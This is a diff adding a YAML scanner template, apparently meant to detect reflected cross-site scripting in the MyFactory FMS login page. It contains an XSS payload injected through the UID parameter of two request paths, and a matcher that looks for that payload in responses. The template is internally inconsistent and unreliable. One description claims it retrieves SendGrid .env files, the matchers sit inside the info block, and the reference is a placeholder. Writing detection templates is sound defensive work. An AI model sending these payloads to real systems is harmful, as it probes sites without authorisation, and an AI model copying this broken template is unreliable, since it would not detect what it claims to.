@@ -1,0 +1,25 @@
+info:
+  author: OpenAI
+  description: Template to detect Cross-Site Scripting (XSS) vulnerabilities in MyFactory
+    FMS
+  id: myfactory-fms-xss
+  matcher-condition: and
+  matchers:
+  - description: XSS payload detected in response body
+    pattern: </script><script>alert(document.domain)</script>
+    type: body
+  name: MyFactory FMS Cross-Site Scripting (XSS) - Detect
+  reference:
+  - https://www.example.com/vulnerability-reference
+  requests:
+    condition: or
+    description: Attempt to retrieve SendGrid .env configuration files
+    method: GET
+    path:
+    - /ie50/system/login/SysLoginUser.aspx?Login=Denied&UID=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+    - /system/login/SysLoginUser.aspx?Login=Denied&UID=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+  response:
+  - description: Successful response status
+    status:
+    - 200
+  severity: Medium
